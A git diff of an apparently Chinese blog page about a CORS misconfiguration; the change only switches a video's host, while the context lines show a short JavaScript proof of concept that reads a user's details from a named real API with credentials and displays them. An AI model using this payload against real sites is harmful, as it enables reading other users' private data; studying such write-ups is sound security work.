@@ -246,7 +246,8 @@
 <p>[*]payload代码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">function cors() &#123;</div><div class="line">var xhttp = new XMLHttpRequest();</div><div class="line">xhttp.onreadystatechange = function() &#123;</div><div class="line">if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;</div><div class="line">document.getElementById(&quot;demo&quot;).innerHTML =</div><div class="line">alert(this.responseText);</div><div class="line">&#125;</div><div class="line">&#125;;</div><div class="line">xhttp.open(&quot;GET&quot;, &quot;https://api.artsy.net/api/user_details/&lt;User-ID&gt;&quot;, true);</div><div class="line">xhttp.withCredentials = true;</div><div class="line">xhttp.send();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_10/3.png" alt=""></p>
-<h2 id="视屏"><a href="#视屏" class="headerlink" title="视屏"></a>视屏</h2><video id="video" controls preload="none" poster="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=885582068,2021597601&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/translate_10/CORS.mp4" type="video/mp4"><br></video>
+<h2 id="视屏"><a href="#视屏" class="headerlink" title="视屏"></a>视屏</h2><video id="video" controls preload="none" poster="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=885582068,2021597601&fm=26&gp=0.jpg"><br><source id="mp4" src="http://tu.027cgb.com/612577/times0ng_blog/translate_10/CORS.mp4" type="video/mp4"><br></video>
+
 
 
 
